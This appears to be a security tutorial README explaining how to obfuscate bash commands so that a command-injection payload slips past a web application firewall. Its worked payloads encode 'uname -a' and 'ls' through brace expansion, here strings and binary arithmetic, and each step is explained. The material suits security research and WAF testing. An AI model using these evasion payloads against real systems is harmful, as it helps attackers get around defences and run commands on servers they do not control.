# Using bash to bypass WAF in a Command Injection scenario
Bash Command Injection WAF Bypass

<img src="cmd-injection.png" align="center">

### Manual Conversion:

- [Unicode UTF-8 -> Bytes Radix (octal)](https://onlineunicodetools.com/convert-unicode-to-bytes)
- [Decimal -> Binary](https://www.rapidtables.com/convert/number/decimal-to-binary.html)

<br>

<hr>

<br>

> `uname -a`: <br>
```bash
${!##\-}<<<{\$\'\\$(($((1<<1))#10100101))\\$(($((1<<1))#10011100))\\$(($((1<<1))#10001101))\\$(($((1<<1))#10011011))\\$(($((1<<1))#10010001))\',\$\'\\$(($((1<<1))#110111))\\$(($((1<<1))#10001101))\'}
```
> Using a **comma** `,` from **Brace Expansion** so it acts like a **space**. <br>
> The reason why we use **Brace Expansion**: <br>
```console
$ echo {ola,mundo}
ola mundo
```

> In short, this is what's happening: ([Click to see full explanation](#full-explanation))
- `{\$\'command1\',\$\'command2-or-argument2\'}`

<br>

<hr>

<br>

### Video Example:

[![Link](https://img.youtube.com/vi/B4mpV44Z1-8/0.jpg)](https://www.youtube.com/watch?v=B4mpV44Z1-8)

<br>

<hr>

<br>

### Full Explanation:

```bash
### idea: @sirifu4k1

# My final payload:
# ${0##\-}<<<$\'\\$(($((1<<1))#10011010))\\$(($((1<<1))#10100011))\'
# Let's understand what the hell is happening here.

## 1.1: ${0##\-}
# ${} is a parameter expansion; "$0" == is the first parameter, which is the script itself.
# Since we're "executing" "$0" straight on the shell, the program that is getting executed is bash
# But on my shell, bash had a little "-" dash sign next to the "b" letter of bash, so I removed it
# using parameter expansion (${0##\-} == removes the dash "-" from "-bash", and we're left with "bash")

## 1.2: <<<
# A "Here String" is used for input redirection from text or a variable.
# For example: (counting the words of a given file called about.txt)
$ wc -l <<< about.txt
1 # (output as an example)

## 1.3: $\' ... \'
# First of all, "$'Something\nSomething-else'" causes escape sequences to be interpreted.
# So we can call a UTF-8 octal to be interpreted to text, just like so (154 in octal == l; 163 in octal == s):
$'\154\163'

# Another example:
$'\151\144' # 151 == i; 144 == d (id gets interpreted as a command)

## 1.4: \\$(( $(( 1 << 1 ))#10011010)) \\$(( $(( 1 << 1))#10100011 ))
# $(()) == POSIX arithmetic expansion
# Note: (man bash)
# Words of the form $'string' are treated specially. The word expands to
# string, with backslash-escaped characters replaced as specified by the ANSI C
# standard.

# Note:
# The "\\" (double backslash) characters are necessary in order to force the shell to pass
# a "\$" (single backslash, dollar sign) to the arithmetic expansion.

### 2.4: $(( $((1<<1))#10011010 ))
# 1<<1 == 2
# base#number == performing calculations between different arithmetic bases [base#]number
#                base is a decimal integer between 2 and 36 that specifies the arithmetic base. (default is base 10)

# Enclosing two arithmetic expansion inside of each other, so that 2#10011010 (octal "154" to binary is "10011010") is equal to 154
# 167 150 157 :: 10100111 = w; 10010110 = h; 10011101 = o

### 3.4: $(( $((1<<1))#10100011 ))
# Is exatcly the same concept as I mentioned previously (at 2.4), and we're left with 163 (octal)

# Conclusion:
# This whole mess will give us the result $'\154\163', which is "ls"
# or echo -e "\0154\163" to print it as a string

# Image explanation, by @sirifu4k1
# https://pbs.twimg.com/media/FqJd-irakAEBPh_.jpg


# Bonus without using numbers (will execute "ls"):
# ${0##\-}<<<$\'\\$(($((${##}<<${##}))#${##}${#}${#}${##}${##}${#}${##}${#}))\\$(($((${##}<<${##}))#${##}${#}${##}${#}${#}${#}${##}${##}))\'
                                        ^ 10011010 --> Decimal: 154(l)                               ^ 10100011 --> Decimal: 163(s)

${##} == 1
${#}  == 0

echo -ne "${##}${#}${#}${##}${##}${#}${##}${#} ${##}${#}${##}${#}${#}${#}${##}${##}\n"
```
